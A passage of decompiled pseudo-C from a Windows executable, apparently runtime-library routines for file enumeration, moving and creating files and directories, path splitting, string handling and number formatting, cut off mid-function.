void FUN_004086f4(LPWORD param_1)

{
  BOOL BVar1;
  
  BVar1 = FindNextFileA(*(HANDLE *)(param_1 + 10),(LPWIN32_FIND_DATAA)(param_1 + 0xc));
  if (BVar1 != 0) {
    FUN_00408640(param_1);
    return;
  }
  GetLastError();
  return;
}



void FUN_00408718(int param_1)

{
  if (*(HANDLE *)(param_1 + 0x14) != (HANDLE)0xffffffff) {
    FindClose(*(HANDLE *)(param_1 + 0x14));
    *(undefined4 *)(param_1 + 0x14) = 0xffffffff;
  }
  return;
}



bool FUN_00408734(undefined *param_1,undefined *param_2)

{
  LPCSTR lpNewFileName;
  LPCSTR lpExistingFileName;
  BOOL BVar1;
  
  lpNewFileName = FUN_00404c68(param_2);
  lpExistingFileName = FUN_00404c68(param_1);
  BVar1 = MoveFileA(lpExistingFileName,lpNewFileName);
  return (bool)('\x01' - (BVar1 == 0));
}



int FUN_00408758(undefined *param_1,undefined *param_2)

{
  int iVar1;
  char *pcVar2;
  char *pcVar3;
  undefined4 uVar4;
  
  iVar1 = FUN_00404a68((int)param_2);
  pcVar2 = FUN_00404c68(param_1);
  do {
    if (iVar1 < 1) {
      return iVar1;
    }
    if ((param_2[iVar1 + -1] != '\0') &&
       (pcVar3 = thunk_FUN_00408a8a(pcVar2,param_2[iVar1 + -1]), pcVar3 != (char *)0x0)) {
      uVar4 = FUN_0040c164(param_2,iVar1);
      if ((char)uVar4 != '\x02') {
        return iVar1;
      }
      iVar1 = iVar1 + -1;
    }
    iVar1 = iVar1 + -1;
  } while( true );
}



void FUN_004087a8(undefined *param_1,undefined4 *param_2,int *param_3)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  undefined4 *local_c;
  int *local_8;
  
  puStack28 = &stack0xfffffffc;
  local_c = (undefined4 *)0x0;
  puStack32 = &LAB_0040881f;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  local_8 = param_3;
  iVar1 = FUN_00408758(&DAT_00408838,param_1);
  if ((iVar1 == 0) || (param_1[iVar1 + -1] != '.')) {
    iVar1 = 0x7fffffff;
  }
  FUN_00404cc8((int)param_1,1,iVar1 - 1,(int *)&local_c);
  FUN_00404ab4(local_8,local_c,param_2);
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_00408826;
  puStack32 = (undefined *)0x40881e;
  FUN_004047a8((int *)&local_c);
  return;
}



void FUN_0040883c(undefined *param_1,int *param_2)

{
  uint uVar1;
  
  uVar1 = FUN_00408758(&DAT_0040886c,param_1);
  FUN_00404cc8((int)param_1,1,uVar1,param_2);
  return;
}



void FUN_00408870(undefined *param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = FUN_00408758(&DAT_004088a4,param_1);
  FUN_00404cc8((int)param_1,iVar1 + 1,0x7fffffff,param_2);
  return;
}



void FUN_004088a8(undefined *param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = FUN_00408758(&DAT_004088ec,param_1);
  if ((iVar1 < 1) || (param_1[iVar1 + -1] != '.')) {
    FUN_004047a8(param_2);
  }
  else {
    FUN_00404cc8((int)param_1,iVar1,0x7fffffff,param_2);
  }
  return;
}



void FUN_004088f0(undefined *param_1,int *param_2)

{
  LPCSTR lpFileName;
  DWORD DVar1;
  undefined4 *lpBuffer;
  LPSTR *lpFilePart;
  LPSTR pCStack272;
  undefined4 local_10c [65];
  
  lpFilePart = &pCStack272;
  lpBuffer = local_10c;
  DVar1 = 0x104;
  lpFileName = FUN_00404c68(param_1);
  DVar1 = GetFullPathNameA(lpFileName,DVar1,(LPSTR)lpBuffer,lpFilePart);
  FUN_00404898(param_2,local_10c,DVar1);
  return;
}



bool FUN_004089a0(undefined *param_1)

{
  LPCSTR lpPathName;
  BOOL BVar1;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  
  lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
  lpPathName = FUN_00404c68(param_1);
  BVar1 = CreateDirectoryA(lpPathName,lpSecurityAttributes);
  return (bool)('\x01' - (BVar1 == 0));
}



int FUN_004089bc(char *param_1)

{
  char cVar1;
  int iVar2;
  
  iVar2 = -1;
  do {
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    cVar1 = *param_1;
    param_1 = param_1 + 1;
  } while (cVar1 != '\0');
  return -2 - iVar2;
}



undefined4 * FUN_004089d4(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  FUN_0040285c(param_2,param_1,param_3);
  return param_1;
}



undefined4 * FUN_004089e4(undefined4 *param_1,undefined4 *param_2,int param_3)

{
  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  bool bVar4;
  
  bVar4 = param_3 == 0;
  iVar1 = param_3;
  puVar3 = param_2;
  if (!bVar4) {
    do {
      if (iVar1 == 0) break;
      iVar1 = iVar1 + -1;
      bVar4 = *(char *)puVar3 == '\0';
      puVar3 = (undefined4 *)((int)puVar3 + 1);
    } while (!bVar4);
    if (bVar4) {
      iVar1 = iVar1 + 1;
    }
  }
  puVar3 = param_1;
  for (uVar2 = (uint)(param_3 - iVar1) >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {
    *puVar3 = *param_2;
    param_2 = param_2 + 1;
    puVar3 = puVar3 + 1;
  }
  for (uVar2 = param_3 - iVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
    *(undefined *)puVar3 = *(undefined *)param_2;
    param_2 = (undefined4 *)((int)param_2 + 1);
    puVar3 = (undefined4 *)((int)puVar3 + 1);
  }
  *(undefined *)puVar3 = 0;
  return param_1;
}



void FUN_00408a18(undefined4 *param_1,undefined *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  
  iVar1 = FUN_00404a68((int)param_2);
  puVar2 = (undefined4 *)FUN_00404c68(param_2);
  FUN_004089e4(param_1,puVar2,iVar1);
  return;
}



void FUN_00408a3c(char *param_1,char *param_2,int param_3)

{
  char *pcVar1;
  char cVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  char *pcVar7;
  bool bVar8;
  
  uVar4 = 0;
  iVar6 = param_3;
  pcVar7 = param_2;
  if (param_3 != 0) {
    do {
      if (iVar6 == 0) break;
      iVar6 = iVar6 + -1;
      cVar2 = *pcVar7;
      pcVar7 = pcVar7 + 1;
    } while (cVar2 != '\0');
    iVar6 = param_3 - iVar6;
    bVar8 = true;
LAB_00408a55:
    do {
      if (iVar6 != 0) {
        iVar6 = iVar6 + -1;
        pcVar1 = param_2 + 1;
        pcVar7 = param_1 + 1;
        bVar8 = *param_1 == *param_2;
        param_1 = pcVar7;
        param_2 = pcVar1;
        if (bVar8) goto LAB_00408a55;
      }
      if (bVar8) {
        return;
      }
      bVar3 = param_1[-1];
      uVar5 = uVar4 & 0xffffff00 | (uint)bVar3;
      if ((0x60 < bVar3) && (bVar3 < 0x7b)) {
        uVar5 = uVar4 & 0xffffff00 | (uint)(byte)(bVar3 - 0x20);
      }
      bVar3 = param_2[-1];
      uVar4 = (uint)bVar3;
      if ((0x60 < bVar3) && (bVar3 < 0x7b)) {
        uVar4 = (uint)(byte)(bVar3 - 0x20);
      }
      uVar4 = uVar5 - uVar4;
      bVar8 = uVar4 == 0;
    } while (bVar8);
  }
  return;
}



char * thunk_FUN_00408a8a(char *param_1,char param_2)

{
  while( true ) {
    if (param_2 == *param_1) {
      return param_1;
    }
    if (*param_1 == '\0') break;
    param_1 = param_1 + 1;
  }
  return (char *)0x0;
}



char * FUN_00408a8a(char *param_1,char param_2)

{
  while( true ) {
    if (param_2 == *param_1) {
      return param_1;
    }
    if (*param_1 == '\0') break;
    param_1 = param_1 + 1;
  }
  return (char *)0x0;
}



char * FUN_00408a94(char *param_1,char *param_2)

{
  char cVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  char *pcVar7;
  char *pcVar8;
  bool bVar9;
  
  if ((param_1 != (char *)0x0) && (param_2 != (char *)0x0)) {
    uVar2 = 0xffffffff;
    pcVar7 = param_2;
    do {
      if (uVar2 == 0) break;
      uVar2 = uVar2 - 1;
      cVar1 = *pcVar7;
      pcVar7 = pcVar7 + 1;
    } while (cVar1 != '\0');
    uVar3 = ~uVar2 - 1;
    if (uVar3 != 0) {
      uVar4 = 0xffffffff;
      pcVar7 = param_1;
      do {
        if (uVar4 == 0) break;
        uVar4 = uVar4 - 1;
        cVar1 = *pcVar7;
        pcVar7 = pcVar7 + 1;
      } while (cVar1 != '\0');
      iVar5 = ~uVar4 - uVar3;
      bVar9 = iVar5 == 0;
      if (uVar3 <= ~uVar4 && !bVar9) {
        do {
          pcVar7 = param_2 + 1;
          pcVar8 = param_1;
          do {
            param_1 = pcVar8;
            if (iVar5 == 0) break;
            iVar5 = iVar5 + -1;
            param_1 = pcVar8 + 1;
            bVar9 = *param_2 == *pcVar8;
            pcVar8 = param_1;
          } while (!bVar9);
          iVar6 = ~uVar2 - 2;
          pcVar8 = param_1;
          if (!bVar9) {
            return (char *)0x0;
          }
          do {
            if (iVar6 == 0) break;
            bVar9 = *pcVar7 == *pcVar8;
            iVar6 = iVar6 + -1;
            pcVar8 = pcVar8 + 1;
            pcVar7 = pcVar7 + 1;
          } while (bVar9);
          if (bVar9) {
            return param_1 + -1;
          }
        } while( true );
      }
    }
  }
  return (char *)0x0;
}



void FUN_00408ae8(undefined4 *param_1,int *param_2)

{
  FUN_004049a0(param_2,param_1);
  return;
}



int * FUN_00408afc(int param_1)

{
  int *piVar1;
  
  piVar1 = (int *)FUN_004026a8(param_1 + 4);
  *piVar1 = param_1 + 4;
  return piVar1 + 1;
}



undefined4 * FUN_00408b10(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 *puVar3;
  
  if (param_1 == (undefined4 *)0x0) {
    return (undefined4 *)0x0;
  }
  iVar1 = FUN_004089bc((char *)param_1);
  piVar2 = FUN_00408afc(iVar1 + 1U);
  puVar3 = FUN_004089d4(piVar2,param_1,iVar1 + 1U);
  return puVar3;
}



void FUN_00408b3c(int param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined uStack53;
  undefined4 auStack52 [8];
  undefined *local_14;
  undefined local_10;
  
  local_14 = &uStack53 + 1;
  if (0x1f < param_3) {
    param_3 = 0x1f;
  }
  uVar1 = FUN_0040c188((byte *)param_2,param_3 - 1);
  if ((char)uVar1 == '\x01') {
    param_3 = param_3 - 1;
  }
  FUN_004089d4((undefined4 *)(&uStack53 + 1),param_2,param_3);
  (&uStack53)[param_3 + 1] = 0;
  local_10 = 6;
  FUN_00407d90((&PTR_PTR_DAT_0043f184)[param_1],&local_14,0);
  return;
}



void FUN_00408bb8(int *param_1)

{
  FUN_004047a8(param_1);
  return;
}



void FUN_00408bc4(byte *param_1,byte *param_2,byte *param_3,undefined4 param_4,undefined4 param_5,
                 int param_6)

{
  byte bVar1;
  uint uVar2;
  char cVar3;
  uint uVar4;
  undefined4 uVar5;
  byte *pbVar6;
  byte *extraout_ECX;
  byte *extraout_ECX_00;
  byte *extraout_ECX_01;
  byte *extraout_EDX;
  byte *extraout_EDX_00;
  byte *pbVar7;
  byte *pbVar8;
  byte *pbVar9;
  byte *pbVar10;
  byte *pbVar11;
  bool bVar12;
  byte bVar13;
  int local_14;
  byte *local_10;
  byte *local_c;
  undefined4 local_8;
  
  bVar13 = 0;
  local_8 = 0;
  pbVar6 = param_3 + param_6;
  uVar4 = 0;
  local_10 = (byte *)0x0;
  local_14 = 0;
  local_c = param_1;
LAB_00408bed:
  if (param_2 != (byte *)0x0) {
    do {
      if (param_3 == pbVar6) break;
      pbVar9 = param_3 + (uint)bVar13 * -2 + 1;
      bVar1 = *param_3;
      uVar2 = uVar4 & 0xffffff00;
      uVar4 = uVar2 | bVar1;
      param_3 = pbVar9;
      if (bVar1 == 0x25) {
        if (pbVar9 == pbVar6) break;
        param_3 = pbVar9 + (uint)bVar13 * -2 + 1;
        uVar4 = uVar2 | *pbVar9;
        if (*pbVar9 != 0x25) goto code_r0x00408c11;
      }
      pbVar9 = param_1 + (uint)bVar13 * -2 + 1;
      *param_1 = (byte)uVar4;
      param_2 = param_2 + -1;
      param_1 = pbVar9;
      if (param_2 == (byte *)0x0) break;
    } while( true );
  }
LAB_00408bfe:
  FUN_00408f1b((int)param_1 - (int)local_c);
  return;
code_r0x00408c11:
  pbVar9 = param_3 + -2;
  while( true ) {
    cVar3 = (char)uVar4;
    pbVar10 = param_3;
    if (cVar3 == '-') {
      if (param_3 == pbVar6) goto LAB_00408bfe;
      pbVar10 = param_3 + (uint)bVar13 * -2 + 1;
      uVar4 = uVar4 & 0xffffff00 | (uint)*param_3;
    }
    uVar4 = FUN_00408ca6(uVar4,param_2,pbVar6);
    pbVar6 = extraout_ECX;
    if ((char)uVar4 != ':') break;
    local_10 = pbVar9;
    if (pbVar10 == extraout_ECX) goto LAB_00408bfe;
    param_3 = pbVar10 + (uint)bVar13 * -2 + 1;
    uVar4 = uVar4 & 0xffffff00 | (uint)*pbVar10;
    param_2 = extraout_EDX;
  }
  pbVar7 = extraout_EDX;
  param_3 = pbVar10;
  if ((char)uVar4 == '.') {
    if (pbVar10 == extraout_ECX) goto LAB_00408bfe;
    param_3 = pbVar10 + (uint)bVar13 * -2 + 1;
    uVar4 = FUN_00408ca6(uVar4 & 0xffffff00 | (uint)*pbVar10,extraout_EDX,extraout_ECX);
    pbVar6 = extraout_ECX_00;
    pbVar7 = extraout_EDX_00;
  }
  uVar5 = FUN_00408cee((byte)uVar4,pbVar7,(uint)pbVar6);
  pbVar9 = pbVar9 + -(int)extraout_ECX_01;
  if (pbVar9 < extraout_ECX_01) {
    pbVar9 = (byte *)0x0;
  }
  pbVar10 = extraout_ECX_01;
  pbVar11 = param_3;
  if (cVar3 == '-') {
    bVar12 = pbVar7 < extraout_ECX_01;
    pbVar7 = pbVar7 + -(int)extraout_ECX_01;
    if (bVar12) {
      pbVar10 = extraout_ECX_01 + (int)pbVar7;
      pbVar7 = (byte *)0x0;
    }
    for (; pbVar10 != (byte *)0x0; pbVar10 = pbVar10 + -1) {
      *param_1 = *pbVar11;
      pbVar11 = pbVar11 + (uint)bVar13 * -2 + 1;
      param_1 = param_1 + (uint)bVar13 * -2 + 1;
    }
  }
  pbVar8 = pbVar7 + -(int)pbVar9;
  if (pbVar7 < pbVar9) {
    pbVar9 = pbVar9 + (int)pbVar8;
    pbVar8 = (byte *)0x0;
  }
  uVar4 = CONCAT31((int3)((uint)uVar5 >> 8),0x20);
  for (; pbVar9 != (byte *)0x0; pbVar9 = pbVar9 + -1) {
    *param_1 = 0x20;
    param_1 = param_1 + (uint)bVar13 * -2 + 1;
  }
  param_2 = pbVar8 + -(int)pbVar10;
  if (pbVar8 < pbVar10) {
    pbVar10 = pbVar10 + (int)param_2;
    param_2 = (byte *)0x0;
  }
  for (; pbVar10 != (byte *)0x0; pbVar10 = pbVar10 + -1) {
    *param_1 = *pbVar11;
    pbVar11 = pbVar11 + (uint)bVar13 * -2 + 1;
    param_1 = param_1 + (uint)bVar13 * -2 + 1;
  }
  if (local_14 != 0) {
    uVar4 = FUN_00408bb8(&local_14);
  }
  goto LAB_00408bed;
}



uint FUN_00408ca6(uint param_1,undefined4 param_2,byte *param_3)

{
  uint uVar1;
  int unaff_EBP;
  byte *unaff_ESI;
  int unaff_EDI;
  
  if ((char)param_1 == '*') {
    uVar1 = *(uint *)(unaff_EBP + -0xc);
    if ((int)uVar1 <= *(int *)(unaff_EBP + 8)) {
      *(int *)(unaff_EBP + -0xc) = *(int *)(unaff_EBP + -0xc) + 1;
    }
    if (unaff_ESI == param_3) {
LAB_00408bfe:
      uVar1 = FUN_00408f1b(unaff_EDI - *(int *)(unaff_EBP + -8));
      return uVar1;
    }
    param_1 = uVar1 & 0xffffff00 | (uint)*unaff_ESI;
  }
  else {
    while ((0x2f < (byte)param_1 && ((byte)param_1 < 0x3a))) {
      if (unaff_ESI == param_3) goto LAB_00408bfe;
      param_1 = (uint)*unaff_ESI;
      unaff_ESI = unaff_ESI + 1;
    }
  }
  return param_1;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_00408cee(byte param_1,undefined4 param_2,uint param_3)

{
  undefined4 *puVar1;
  int iVar2;
  byte bVar3;
  undefined4 uVar4;
  int iVar5;
  ulonglong *puVar6;
  char cVar7;
  short sVar9;
  uint uVar10;
  undefined4 extraout_ECX;
  undefined3 uVar11;
  uint uVar12;
  int unaff_EBP;
  byte *pbVar13;
  float10 fVar14;
  float10 fVar15;
  float10 fVar16;
  int iStack8;
  int iStack4;
  char cVar8;
  
  uVar4 = 1;
  iVar5 = *(int *)(unaff_EBP + -0xc);
  if (iVar5 <= *(int *)(unaff_EBP + 8)) {
    *(int *)(unaff_EBP + -0xc) = *(int *)(unaff_EBP + -0xc) + 1;
    puVar1 = (undefined4 *)(*(int *)(unaff_EBP + 0xc) + iVar5 * 8);
    uVar12 = (uint)*(byte *)(puVar1 + 1);
                    // WARNING: Could not recover jumptable at 0x00408d0e. Too many branches
                    // WARNING: Treating indirect jump as call
    (*(code *)(&PTR_LAB_00408d15)[uVar12])
              (*puVar1,uVar12,param_3 & 0xffffff00 | (uint)(param_1 & 0xdf));
    return;
  }
  while( true ) {
    iStack4 = 0x408d60;
    iVar5 = FUN_00408f1b(uVar4);
    iStack4 = 0x408d70;
    puVar6 = (ulonglong *)
             FUN_00408b3c(iVar5,*(undefined4 **)(unaff_EBP + -0x18),
                          *(int *)(unaff_EBP + -0x28) - (int)*(undefined4 **)(unaff_EBP + -0x18));
    uVar12 = *(uint *)(unaff_EBP + -0x24);
    if (0x20 < uVar12) {
      uVar12 = 0;
    }
    cVar8 = (char)extraout_ECX;
    uVar11 = (undefined3)((uint)extraout_ECX >> 8);
    cVar7 = cVar8 + -0x44;
    if (cVar7 == '\0') break;
    cVar7 = '\x10';
    uVar11 = 0;
    if (cVar8 == 'X') break;
    cVar7 = '\n';
    uVar11 = 0;
    if (cVar8 == 'U') break;
    uVar4 = 0;
  }
  sVar9 = (short)CONCAT31(uVar11,cVar7);
  if ((cVar7 == '\0') && (sVar9 = 10, (*(uint *)((int)puVar6 + 4) & 0x80000000) != 0)) {
    iStack8 = -*(int *)puVar6;
    iStack4 = -(*(int *)((int)puVar6 + 4) + (uint)(*(int *)puVar6 != 0));
    FUN_00408090((ulonglong *)&iStack8,uVar12,10);
    *(undefined *)(unaff_EBP + -0x4a) = 0x2d;
    return;
  }
  if ((*(uint *)((int)puVar6 + 4) & 0x80000000) == 0) {
    fVar16 = (float10)*puVar6;
  }
  else {
    fVar16 = (float10)0x7fffffffffffffff + (float10)1 + (float10)(*puVar6 & 0x7fffffffffffffff);
  }
  fVar14 = (float10)sVar9;
  pbVar13 = (byte *)(unaff_EBP + -0x49);
  do {
    pbVar13 = pbVar13 + -1;
    fVar15 = fVar16 - (fVar16 / fVar14) * fVar14;
    fVar16 = fVar16 / fVar14;
    iStack8._0_1_ = (char)(short)ROUND(fVar15);
    bVar3 = (char)iStack8 + 0x30;
    if (0x39 < bVar3) {
      bVar3 = (char)iStack8 + 0x37;
    }
    *pbVar13 = bVar3;
  } while ((float10)1 <= fVar16);
  uVar10 = (int)(byte *)(unaff_EBP + -0x49) - (int)pbVar13;
  iVar5 = uVar12 - uVar10;
  if (uVar10 <= uVar12 && iVar5 != 0) {
    iVar2 = -iVar5;
    while (iVar5 = iVar5 + -1, iVar5 != 0) {
      (pbVar13 + iVar2)[iVar5] = 0x30;
    }
    pbVar13[iVar2] = 0x30;
  }
  return;
}



undefined4 FUN_00408f1b(undefined4 param_1)

{
  int unaff_EBP;
  
  FUN_004047a8((int *)(unaff_EBP + -0x14));
  return param_1;
}



byte * FUN_00408f3c(byte *param_1,byte *param_2,byte *param_3,undefined4 param_4,undefined4 param_5)

{
  int iVar1;
  
  if ((param_1 == (byte *)0x0) || (param_3 == (byte *)0x0)) {
    param_1 = (byte *)0x0;
  }
  else {
    iVar1 = FUN_004089bc((char *)param_3);
    iVar1 = FUN_00408bc4(param_1,param_2,param_3,param_4,param_5,iVar1);
    param_1[iVar1] = 0;
  }
  return param_1;
}



void FUN_00408f7c(byte *param_1,undefined4 param_2,undefined4 param_3,byte **param_4)

{
  FUN_00408f90(param_4,param_1,param_2,param_3);
  return;
}



void FUN_00408f90(byte **param_1,byte *param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  undefined4 local_100c [2];
  byte **ppbStack4100;
  undefined4 local_c;
  byte *local_8;
  
  ppbStack4100 = param_1;
  local_c = param_3;
  local_8 = param_2;
  iVar1 = FUN_00404a68((int)param_2);
  if (iVar1 < 0xc00) {
    iVar1 = FUN_00404a68((int)local_8);
    uVar2 = FUN_00408bc4((byte *)local_100c,(byte *)0xfff,local_8,param_4,local_c,iVar1);
    uVar3 = 0x1000;
  }
  else {
    uVar2 = FUN_00404a68((int)local_8);
    uVar3 = uVar2;
  }
  if ((int)uVar2 < (int)(uVar3 - 1)) {
    FUN_00404898((int *)param_1,local_100c,uVar2);
  }
  else {
    while ((int)(uVar3 - 1) <= (int)uVar2) {
      uVar3 = uVar3 * 2;
      FUN_004047a8((int *)param_1);
      FUN_00404d98((int *)param_1,uVar3);
      iVar1 = FUN_00404a68((int)local_8);
      uVar2 = FUN_00408bc4(*param_1,(byte *)(uVar3 - 1),local_8,param_4,local_c,iVar1);
    }
    FUN_00404d98((int *)param_1,uVar2);
  }
  return;
}



uint FUN_00409050(undefined4 param_1,uint param_2,int param_3)

{
  char cVar2;
  uint uVar1;
  char unaff_BL;
  uint *puVar3;
  undefined *unaff_EDI;
  char *pcVar4;
  uint local_8;
  
  *unaff_EDI = (char)param_1;
  if (unaff_BL == '\0') {
    param_2 = 0;
LAB_00409066:
    cVar2 = (char)((uint)param_1 >> 8);
    pcVar4 = unaff_EDI + 1;
    if (cVar2 == '\0') goto LAB_0040906d;
  }
  else {
    if (-1 < (int)param_2) goto LAB_00409066;
    cVar2 = '-';
    param_2 = -param_2;
  }
  pcVar4 = unaff_EDI + 2;
  unaff_EDI[1] = cVar2;
LAB_0040906d:
  puVar3 = &local_8;
  local_8 = param_2;
  do {
    do {
      uVar1 = param_2 / DAT_0043f198;
      *(char *)puVar3 = (char)(param_2 % DAT_0043f198) + '0';
      puVar3 = (uint *)((int)puVar3 + 1);
      param_3 = param_3 + -1;
      param_2 = uVar1;
    } while (uVar1 != 0);
  } while (0 < param_3);
  do {
    puVar3 = (uint *)((int)puVar3 + -1);
    *pcVar4 = *(char *)puVar3;
    pcVar4 = pcVar4 + 1;
  } while (puVar3 != &local_8);
  return local_8;
}



int FUN_00409094(undefined *param_1,undefined4 param_2,char param_3,undefined4 param_4,int param_5,
                byte param_6)

{
  int iVar1;
  int extraout_ECX;
  uint uVar2;
  undefined *puVar3;
  undefined *puVar4;
  byte bVar5;
  ushort local_30 [12];
  int local_18;
  undefined local_12;
  undefined local_11;
  undefined4 local_10;
  undefined local_a;
  undefined local_9;
  undefined *local_8;
  
  bVar5 = 0;
  local_9 = DAT_0044267f;
  local_a = DAT_0044267e;
  local_10 = DAT_00442678;
  local_11 = DAT_0044267c;
  local_12 = DAT_0044267d;
  local_18 = 0;
  iVar1 = 0x13;
  if (param_3 == '\0') {
    iVar1 = param_5;
    if (param_5 < 2) {
      iVar1 = 2;
    }
    if (0x12 < iVar1) {
      iVar1 = 0x12;
    }
  }
  local_8 = param_1;
  FUN_00409368(local_30,param_2,param_3);
  puVar4 = local_8;
  if (local_30[0] - 0x7fff < 2) {
    FUN_00409193();
    puVar3 = &DAT_00409184 + local_18 + extraout_ECX * 3;
    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {
      *puVar4 = *puVar3;
      puVar3 = puVar3 + (uint)bVar5 * -2 + 1;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
  }
  else {
    uVar2 = (uint)param_6;
    if ((param_6 != 1) && ((4 < param_6 || (iVar1 < (short)local_30[0])))) {
      uVar2 = 0;
    }
    (*(code *)(*(int *)((int)&PTR_LAB_00409170 + local_18 + uVar2 * 4) + local_18))();
  }
  return (int)puVar4 - (int)local_8;
}



char FUN_0040918a(void)

{
  char cVar1;
  char *unaff_ESI;
  
  cVar1 = *unaff_ESI;
  if (cVar1 == '\0') {
    cVar1 = '0';
  }
  return cVar1;
}



void FUN_00409193(void)

{
  int unaff_EBP;
  undefined *unaff_EDI;
  
  if (*(char *)(unaff_EBP + -0x2a) != '\0') {
    *unaff_EDI = 0x2d;
  }
  return;
}



void FUN_00409235(void)

{
  char cVar1;
  int iVar2;
  int extraout_ECX;
  uint uVar3;
  uint extraout_EDX;
  int extraout_EDX_00;
  int iVar4;
  int unaff_EBP;
  char *unaff_EDI;
  char *pcVar5;
  char *pcVar6;
  byte bVar7;
  
  bVar7 = 0;
  uVar3 = *(uint *)(unaff_EBP + 8);
  if (0x11 < uVar3) {
    uVar3 = 0x12;
  }
  iVar2 = (int)*(short *)(unaff_EBP + -0x2c);
  if (iVar2 < 1) {
    pcVar5 = unaff_EDI + 1;
    *unaff_EDI = '0';
  }
  else {
    iVar4 = 0;
    if (*(char *)(unaff_EBP + 0x10) != '\x02') {
      iVar4 = (byte)((ushort)(*(short *)(unaff_EBP + -0x2c) - 1U) % 3) + 1;
    }
    while( true ) {
      cVar1 = FUN_0040918a();
      pcVar5 = unaff_EDI + (uint)bVar7 * -2 + 1;
      *unaff_EDI = cVar1;
      iVar2 = extraout_ECX + -1;
      uVar3 = extraout_EDX;
      if (iVar2 == 0) break;
      iVar4 = iVar4 + -1;
      unaff_EDI = pcVar5;
      if ((iVar4 == 0) && (*(char *)(unaff_EBP + -6) != '\0')) {
        unaff_EDI = pcVar5 + (uint)bVar7 * -2 + 1;
        *pcVar5 = *(char *)(unaff_EBP + -6);
        iVar4 = 3;
      }
    }
  }
  if (uVar3 != 0) {
    pcVar6 = pcVar5;
    if (*(char *)(unaff_EBP + -5) != '\0') {
      pcVar6 = pcVar5 + (uint)bVar7 * -2 + 1;
      *pcVar5 = *(char *)(unaff_EBP + -5);
    }
    for (; iVar2 != 0; iVar2 = iVar2 + 1) {
      *pcVar6 = '0';
      uVar3 = uVar3 - 1;
      if (uVar3 == 0) {
        return;
      }
      pcVar6 = pcVar6 + (uint)bVar7 * -2 + 1;
    }
    do {
      cVar1 = FUN_0040918a();
      *pcVar6 = cVar1;
      pcVar6 = pcVar6 + (uint)bVar7 * -2 + 1;
    } while (extraout_EDX_00 != 1);
  }
  return;
}



void FUN_004092ee(void)

{
  int iVar1;
  int unaff_EBP;
  undefined *puVar2;
  undefined *unaff_EDI;
  
  puVar2 = *(undefined **)(unaff_EBP + -0xc);
  if (puVar2 != (undefined *)0x0) {
    iVar1 = *(int *)(puVar2 + -4);
    for (; iVar1 != 0; iVar1 = iVar1 + -1) {
      *unaff_EDI = *puVar2;
      puVar2 = puVar2 + 1;
      unaff_EDI = unaff_EDI + 1;
    }
  }
  return;
}



void FUN_00409368(undefined4 param_1,undefined4 param_2,char param_3)

{
  if (param_3 == '\0') {
    FUN_00409395();
  }
  else {
    FUN_004094b7();
  }
  return;
}



void FUN_00409395(void)

{
  char *pcVar1;
  byte bVar2;
  undefined2 uVar3;
  uint uVar4;
  ushort uVar5;
  int iVar6;
  undefined2 *unaff_EBX;
  int unaff_EBP;
  float10 *unaff_ESI;
  short *psVar7;
  short *psVar8;
  byte bVar9;
  float10 fVar10;
  
  bVar9 = 0;
  uVar5 = *(ushort *)((int)unaff_ESI + 8);
  uVar4 = uVar5 & 0x7fff;
  if ((uVar5 & 0x7fff) == 0) {
LAB_004093c0:
    uVar5 = 0;
  }
  else {
    if (uVar4 != 0x7fff) {
      fVar10 = *unaff_ESI;
      *(int *)(unaff_EBP + -8) = ((int)((uVar4 - 0x3fff) * 0x4d10) >> 0x10) + 1;
      fVar10 = ABS(fVar10);
      thunk_FUN_004036a0();
      fVar10 = ROUND(fVar10);
      *(ushort *)(unaff_EBP + -10) =
           (ushort)(*(float10 *)(&DAT_0043f18c + *(int *)(unaff_EBP + -4)) < fVar10) << 8 |
           (ushort)(*(float10 *)(&DAT_0043f18c + *(int *)(unaff_EBP + -4)) == fVar10) << 0xe;
      if ((*(ushort *)(unaff_EBP + -10) & 0x4100) != 0) {
        fVar10 = fVar10 / (float10)*(int *)((int)&DAT_0043f198 + *(int *)(unaff_EBP + -4));
        *(int *)(unaff_EBP + -8) = *(int *)(unaff_EBP + -8) + 1;
      }
      *(float10 *)(unaff_EBP + -0x18) = fVar10;
      iVar6 = 9;
      psVar7 = (short *)((int)unaff_EBX + 3);
      do {
        bVar2 = *(byte *)(iVar6 + -0x19 + unaff_EBP);
        psVar8 = psVar7 + (uint)bVar9 * -2 + 1;
        *psVar7 = (CONCAT11(bVar2,bVar2 >> 4) & 0xfff) + 0x3030;
        iVar6 = iVar6 + -1;
        psVar7 = psVar8;
      } while (iVar6 != 0);
      *(undefined *)psVar8 = 0;
      uVar4 = *(int *)(unaff_EBP + -8) + *(int *)(unaff_EBP + 8);
      if ((int)uVar4 < 0) {
        uVar4 = 0;
        goto LAB_004093c0;
      }
      if (*(uint *)(unaff_EBP + 0xc) <= uVar4) {
        uVar4 = *(uint *)(unaff_EBP + 0xc);
      }
      if (uVar4 < 0x12) {
        if (*(byte *)((int)unaff_EBX + uVar4 + 3) < 0x35) goto LAB_00409482;
        do {
          *(undefined *)((int)unaff_EBX + uVar4 + 3) = 0;
          if ((int)(uVar4 - 1) < 0) {
            *(undefined2 *)((int)unaff_EBX + 3) = 0x31;
            *(int *)(unaff_EBP + -8) = *(int *)(unaff_EBP + -8) + 1;
            break;
          }
